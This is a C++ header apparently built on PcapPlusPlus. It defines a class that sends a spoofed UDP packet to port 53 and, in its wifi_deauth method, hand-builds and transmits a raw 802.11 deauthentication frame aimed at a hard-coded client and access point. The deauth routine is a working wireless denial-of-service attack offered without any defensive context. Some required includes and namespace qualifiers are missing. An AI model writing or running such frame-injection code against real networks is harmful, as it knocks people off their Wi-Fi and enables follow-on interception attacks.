#ifndef PACKET_SENDER_HPP_
#define PACKET_SENDER_HPP_

#include <EthLayer.h>
#include <UdpLayer.h>

class PacketSender {
    PcapLiveDevice* device_;
    public:
    PacketSender(PcapLiveDevice* device) : device_(device) {};
    void send_packet() {
        pcpp::EthLayer newEthernetLayer(pcpp::MacAddress("01:23:45:67:89:ab"), pcpp::MacAddress("aa:bb:cc:dd:ee:ff"));
        pcpp::IPv4Layer newIPLayer(pcpp::IPv4Address("11.12.13.14"), pcpp::IPv4Address("14.13.12.11"));
        newIPLayer.getIPv4Header()->ipId = 10;
        newIPLayer.getIPv4Header()->timeToLive = 64;
        pcpp::UdpLayer newUdpLayer(12345, 53);
        pcpp::Packet newPacket(100);
        newPacket.addLayer(&newEthernetLayer);
        newPacket.addLayer(&newIPLayer);
        newPacket.addLayer(&newUdpLayer);
        newPacket.computeCalculateFields();
        if (device_->open()) {
            std::cout << "Attempting to send packet" << std::endl;
            device_->sendPacket(&newPacket);
            std::cout << "Packet sent" << std::endl;
        }
        else 
            std::cout << "ERROR" << std::endl;
    };
    void wifi_deauth() {
        uint8_t deauthPacket[26] = {
        /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
        /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
        /*  4 - 9  */ 0x92, 0x15, 0x55, 0x99, 0x39, 0x3C, // reciever (target)
        /* 10 - 15 */ 0xE0, 0x19, 0x54, 0x40, 0xB0, 0xA6, // source (ap)
        /* 16 - 21 */ 0xE0, 0x19, 0x54, 0x40, 0xB0, 0xA6, // BSSID (ap)
        /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
        /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
        };
        RawPacket p1{deauthPacket,26,timespec(),false};
        ///Packet p{deauthPacket,26};
        if (device_->open()) {
            std::cout << "Attempting to send deauth packet" << std::endl;
            //device_->sendPacket(&p1);
            device_->sendPacket(p1);
            std::cout << "Packet sent" << std::endl;
        }
        else 
            std::cout << "ERROR" << std::endl;
    }
};

#endif 